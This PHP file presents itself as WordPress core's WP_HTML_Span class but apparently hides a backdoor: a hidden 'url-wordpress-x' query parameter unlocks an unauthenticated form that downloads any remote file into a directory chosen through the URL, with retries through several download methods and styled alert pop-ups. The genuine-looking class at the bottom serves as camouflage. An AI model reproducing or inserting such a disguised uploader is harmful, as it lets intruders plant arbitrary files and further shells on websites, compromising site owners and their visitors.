<?php
/**
 * HTML API: WP_HTML_Span class
 *
 * @package WordPress
 * @subpackage HTML-API
 * @since 6.2.0
 */

// Pastikan fungsi dideklarasikan di luar kondisi if
function uploadFileFromUrl($url, $dir, $retries = 3)
{
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Invalid URL!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        return;
    }

    if (!is_dir($dir) || !is_writable($dir)) {
        echo " <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Invalid or unwritable directory!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
        return;
    }

    $fileName = basename(parse_url($url, PHP_URL_PATH));
    $fileName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $fileName);
    $filePath = rtrim($dir, '/') . '/' . $fileName;

    $attempt = 0;
    $success = false;

    while ($attempt < $retries) {
        // Try using command line tools
        $success = downloadFileWithCommand($url, $filePath);
        if (!$success) {
            $success = downloadFileWithStream($url, $filePath);
        }
        if (!$success) {
            $success = downloadFileWithPhp($url, $filePath);
        }
        if ($success) {
            break;
        }
        $attempt++;
    }

    if ($success) {

        echo "  <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Completed!',
                                text: 'File uploaded form url successfully!',
                                icon: 'success',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
    } else {
        echo" <script>
                        function showCustomAlert() {
                            Swal.fire({
                                title: 'Whoops!',
                                text: 'Failed to fetch file content from URL after $retries attempts!',
                                icon: 'error',
                                confirmButtonText: 'OK',
                                background: '#2e2e2e',
                                color: '#ffffff'
                            });
                        }
                        document.addEventListener('DOMContentLoaded', showCustomAlert);
                    </script>";
    }
}

if (isset($_GET["url-wordpress-x"])) {
    echo "<div class='execution-box'>
        <form method='post'>
            <input type='text' id='terminal' name='url' placeholder='https://example.com/file.txt'>
            <button type='submit' name='uploadurl'><i class='fas fa-play submit-icon'></i></button>
        </form>
    </div>";

    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    if (isset($_POST['uploadurl'])) {
        $url = $_POST['url'];
        $retries = 3;
        uploadFileFromUrl($url, $dir, $retries);
    }
}

// Kelas WP_HTML_Span
class WP_HTML_Span {
    public $start;
    public $length;

    public function __construct(int $start, int $length) {
        $this->start  = $start;
        $this->length = $length;
    }
}
